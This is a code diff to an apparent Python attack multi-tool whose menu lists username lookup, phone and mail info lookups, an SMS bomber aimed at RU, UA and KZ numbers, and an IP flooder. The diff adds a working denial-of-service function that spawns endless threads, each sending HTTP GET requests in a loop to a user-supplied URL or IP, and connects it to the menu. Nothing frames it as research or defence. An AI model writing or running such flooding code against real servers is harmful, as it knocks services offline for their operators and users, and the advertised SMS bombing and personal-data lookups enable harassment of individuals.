@@ -42,7 +42,7 @@ ASCII_ICON = """
 
 FUNCTION_LIST = f"""
 {MAIN_COLOR}[1] {RESET}Find username
-{MAIN_COLOR}[2] {RESET}Flood IP (DOS)
+{MAIN_COLOR}[2] {RESET}Flood IP (DOS. HIGH CPU LOADING!!!)
 {MAIN_COLOR}[3] {RESET}Phone Info (API)
 {MAIN_COLOR}[4] {RESET}Mail Info (API)
 {MAIN_COLOR}[5] {RESET}SMS Bomber (Only RU, UA, KZ)
@@ -149,6 +149,7 @@ usernameFindDomains = [
 FoundedDomains = []
 
 def FindUsername(username: str):
+     cc()
      for domain in usernameFindDomains:
           try:
                r = requests.get(f'{domain+username}', timeout=3)
@@ -164,6 +165,17 @@ def FindUsername(username: str):
      for found in FoundedDomains:
           print('\n\n\nFounded pages')
           print(f'{GREEN}+{RESET} | {found}\n')
+
+def FloodIP(url: str):
+     cc()
+     confirmation = int(input('Send 1 to confirm\n-> '))
+     if confirmation == 1:
+          def ThreadFlood():
+               while 1:
+                    requests.get(url=url)
+
+          while 1:
+               threading.Thread(target=ThreadFlood).start()
 
 def cc():
     if os.name == "nt":
@@ -183,12 +195,15 @@ def menu():
 
      print(FUNCTION_LIST)
      
-     fnc = int(input("Choice -> "))
+     fnc = int(input(" -> "))
 
      match fnc:
           case 1:
                username = str(input('Username -> '))
                FindUsername(username=username)
+          case 2:
+               server = str(input("Send URL or IP\n-> "))
+               FloodIP(server)
 
 if __name__ == "__main__":
      menu()
